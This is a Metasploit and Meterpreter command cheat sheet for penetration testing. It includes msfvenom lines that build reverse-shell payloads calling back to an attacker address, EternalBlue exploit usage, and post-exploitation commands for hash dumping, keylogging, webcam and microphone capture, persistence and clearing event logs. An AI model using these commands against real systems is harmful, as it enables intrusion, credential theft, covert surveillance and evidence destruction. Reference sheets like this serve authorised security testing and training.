### **Launching Metasploit Console**
```bash
msfconsole
```

### **Essential Commands**
| Command                      | Usage                                    |
|------------------------------|------------------------------------------|
| `help`                       | List all available commands.            |
| `version`                    | Show the current Metasploit version.    |
| `search [keyword]`           | Search for modules (e.g., `search ms17_010`). |
| `use [module_name]`          | Load a module (e.g., `use exploit/windows/smb/ms17_010_eternalblue`). |
| `show options`               | Display available options for a module. |
| `set [option] [value]`       | Set module options (e.g., `set RHOSTS 192.168.1.1`). |
| `exploit` or `run`           | Launch the exploit/module.              |
| `exit`                       | Exit Metasploit.                        |

---

### **Payload Handling with `msfvenom`**
Generate payloads in various formats:

| Payload Format               | Command Example                                                                 |
|------------------------------|---------------------------------------------------------------------------------|
| Windows EXE                  | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > shell.exe` |
| Linux ELF                    | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf > shell.elf` |
| PHP                          | `msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f raw > shell.php` |
| Python                       | `msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.2 LPORT=4444 -f raw > shell.py` |
| Java JAR                     | `msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f jar > shell.jar` |

---

### **Session Management**
| Command Example                | Description                                             |
|--------------------------------|---------------------------------------------------------|
| `sessions -l`                  | List active sessions.                                   |
| `sessions -i [id]`             | Interact with a specific session.                      |
| `sessions -k [id]`             | Kill a session by ID.                                  |
| `background`                   | Background the current session.                        |
| `sessions -C [command]`        | Run a command on an active session (e.g., `sessions -C sysinfo`). |

---

### **Database Management**
| Command                       | Description                                             |
|-------------------------------|---------------------------------------------------------|
| `db_status`                   | Check database connection status.                      |
| `hosts`                       | List discovered hosts.                                 |
| `services`                    | List services identified on targets.                  |
| `loot`                        | Show looted files and data.                           |
| `db_nmap [args]`              | Run an Nmap scan and store results.                   |

---

### **Useful Metasploit Modules**
| Module Type                   | Command Example                                               |
|-------------------------------|--------------------------------------------------------------|
| Exploits                      | `use exploit/windows/smb/ms17_010_eternalblue`               |
| Auxiliary                     | `use auxiliary/scanner/portscan/tcp`                        |
| Payloads                      | `use payload/windows/meterpreter/reverse_tcp`               |
| Post-Exploitation             | `use post/windows/gather/enum_users`                        |

---

### **Meterpreter Commands**
**Core Commands**
| Command                     | Description                                                 |
|-----------------------------|-------------------------------------------------------------|
| `background`                | Background the session.                                     |
| `exit`                      | Exit Meterpreter.                                          |
| `help`                      | Show help menu for Meterpreter commands.                  |

**File System Commands**
| Command                     | Description                                                 |
|-----------------------------|-------------------------------------------------------------|
| `pwd`                       | Print the current directory.                               |
| `ls`                        | List directory contents.                                   |
| `cd [dir]`                  | Change directory.                                          |
| `download [file]`           | Download a file from the target.                          |
| `upload [file]`             | Upload a file to the target.                              |

**System Commands**
| Command                     | Description                                                 |
|-----------------------------|-------------------------------------------------------------|
| `sysinfo`                   | Display system information.                                |
| `getuid`                    | Show the user Meterpreter is running as.                   |
| `ps`                        | List running processes.                                    |
| `migrate [pid]`             | Migrate Meterpreter to another process.                   |

**Networking Commands**
| Command                     | Description                                                 |
|-----------------------------|-------------------------------------------------------------|
| `arp`                       | Display ARP cache.                                         |
| `ifconfig`                  | Show network interfaces.                                   |
| `route`                     | Display or modify routing table.                          |
| `portfwd add -l [port] -p [port] -r [target]` | Forward ports from local to remote machine.      |

---

### **Post-Exploitation Modules**
| Module                          | Description                                    |
|---------------------------------|------------------------------------------------|
| `post/windows/manage/persistence` | Create persistent access on a Windows target. |
| `post/multi/recon/local_exploit_suggester` | Suggest local exploits for privilege escalation. |
| `post/windows/gather/hashdump`  | Extract password hashes from the SAM database. |

---

### **Additional Useful Commands**
| Command                      | Description                                                 |
|------------------------------|-------------------------------------------------------------|
| `check`                      | Check if the target is vulnerable to the exploit.          |
| `setg [option] [value]`      | Set a global option (e.g., RHOSTS for all modules).         |
| `unset [option]`             | Unset a specific option.                                   |
| `unsetg [option]`            | Unset a global option.                                     |


### **General Commands**
| Command              | Description                                                  |
|----------------------|--------------------------------------------------------------|
| `msfconsole`         | Start the Metasploit Framework console.                      |
| `help` or `?`        | Displays help menu with available commands.                  |
| `version`            | Show Metasploit version and release information.             |
| `banner`             | Change the banner displayed at the top of the console.       |
| `search <keyword>`   | Search for modules using keywords, CVEs, platforms, etc.     |
| `use <module>`       | Load a specific module for use.                              |
| `info <module>`      | Display detailed information about a module.                 |
| `reload_all`         | Reload all modules and libraries.                            |
| `quit` or `exit`     | Exit Metasploit console.                                     |
| `history`            | Display command history.                                     |
| `save`               | Save the current console settings.                           |

---

### **Database Commands**
| Command              | Description                                                  |
|----------------------|--------------------------------------------------------------|
| `db_status`          | Check the connection to the database.                        |
| `db_connect`         | Connect to a database.                                       |
| `db_disconnect`      | Disconnect from the current database.                        |
| `db_export`          | Export the database contents to a file.                      |
| `db_import`          | Import scan results or other data into the database.         |
| `hosts`              | List hosts in the database.                                  |
| `services`           | List services discovered on hosts.                           |
| `vulns`              | List vulnerabilities associated with hosts.                  |
| `loot`               | List loot (files, data, etc.) obtained.                      |
| `notes`              | List notes attached to hosts.                                |
| `workspace`          | Manage workspaces for organizing engagements.                |

---

### **Module Interaction Commands**
| Command              | Description                                                  |
|----------------------|--------------------------------------------------------------|
| `show exploits`      | List all available exploit modules.                          |
| `show payloads`      | List all available payloads.                                 |
| `show auxiliary`     | List all auxiliary modules.                                  |
| `show encoders`      | List all encoders.                                           |
| `show nops`          | List all NOP generators.                                     |
| `show options`       | Display required/optional parameters for the current module. |
| `set <option>`       | Set a value for a module option (e.g., `set RHOST <IP>`).    |
| `unset <option>`     | Unset a previously set option.                               |
| `setg <option>`      | Set a global option that persists across modules.            |
| `unsetg <option>`    | Unset a global option.                                       |
| `back`               | Exit the current module and return to the main console.      |

---

### **Exploitation Commands**
| Command              | Description                                                  |
|----------------------|--------------------------------------------------------------|
| `exploit` or `run`   | Execute the current module.                                  |
| `check`              | Check if the target is vulnerable without exploiting it.     |
| `sessions`           | List active sessions (post-exploitation or Meterpreter).     |
| `sessions -i <id>`   | Interact with a specific session.                            |
| `jobs`               | List background jobs.                                        |
| `kill <job_id>`      | Kill a specific job.                                         |

---

### **Meterpreter Core Commands**
| Command              | Description                                                  |
|----------------------|--------------------------------------------------------------|
| `sysinfo`            | Get system information about the target.                     |
| `getuid`             | Display the user Meterpreter is running as.                  |
| `getpid`             | Display the process ID of the Meterpreter session.           |
| `ps`                 | List running processes on the target.                        |
| `migrate <pid>`      | Migrate Meterpreter to another process.                      |
| `background`         | Background the current session.                              |
| `exit`               | Terminate the Meterpreter session.                           |
| `idletime`           | Display the target's idle time.                              |
| `clearev`            | Clear the target system event logs.                          |
| `reboot`             | Reboot the target machine.                                   |
| `shutdown`           | Shut down the target machine.                                |

---

### **File System Commands**
| Command              | Description                                                  |
|----------------------|--------------------------------------------------------------|
| `ls`                 | List files and directories on the target.                    |
| `cd <path>`          | Change directory on the target.                              |
| `pwd`                | Print working directory.                                     |
| `cat <file>`         | Display the content of a file.                               |
| `upload <file>`      | Upload a file to the target.                                 |
| `download <file>`    | Download a file from the target.                             |
| `rm <file>`          | Delete a file.                                               |
| `edit <file>`        | Edit a file directly on the target.                          |
| `search`             | Search for files on the target.                              |

---

### **Networking Commands**
| Command              | Description                                                  |
|----------------------|--------------------------------------------------------------|
| `arp`                | Show ARP table on the target.                                |
| `ifconfig`           | Show network interfaces on the target.                       |
| `netstat`            | Display active network connections on the target.            |
| `route`              | Show or modify the routing table.                            |
| `portfwd`            | Forward local ports to remote services.                      |

---

### **Post-Exploitation Commands**
| Command              | Description                                                  |
|----------------------|--------------------------------------------------------------|
| `hashdump`           | Dump the SAM database hashes.                                |
| `keyscan_start`      | Start a keylogger.                                           |
| `keyscan_stop`       | Stop the keylogger.                                          |
| `keyscan_dump`       | Dump the keystrokes captured by the keylogger.               |
| `screenshot`         | Capture a screenshot of the target's desktop.                |
| `record_mic`         | Record audio from the target's microphone.                   |
| `webcam_list`        | List available webcams.                                      |
| `webcam_snap`        | Take a snapshot from the webcam.                             |
| `webcam_stream`      | Stream live video from the webcam.                           |

---

### **Msfvenom Payload Generation**
| Command              | Description                                                  |
|----------------------|--------------------------------------------------------------|
| `msfvenom -l`        | List all available payloads.                                 |
| `msfvenom -p`        | Specify a payload (e.g., `msfvenom -p windows/meterpreter/reverse_tcp`). |
| `-f <format>`        | Specify output format (exe, elf, raw, etc.).                 |
| `-o <file>`          | Specify the output file name.                                |
| `-e <encoder>`       | Use an encoder for the payload.                              |

---

### **Session Management Commands**
| Command              | Description                                                  |
|----------------------|--------------------------------------------------------------|
| `sessions -l`        | List all active sessions.                                    |
| `sessions -i <id>`   | Interact with a session.                                     |
| `sessions -k <id>`   | Kill a session by ID.                                        |
| `sessions -K`        | Kill all active sessions.                                    |
| `sessions -c <cmd>`  | Run a command on a session.                                  |

---

### **Miscellaneous Commands**
| Command              | Description                                                  |
|----------------------|--------------------------------------------------------------|
| `load <module>`      | Load an extension or external module (e.g., Kiwi).           |
| `irb`                | Open an interactive Ruby shell.                              |
| `set prompt <value>` | Change the Metasploit prompt.                                |
| `spool <file>`       | Save console output to a file.                               |
| `unset spool`        | Stop spooling console output to a file.                      |

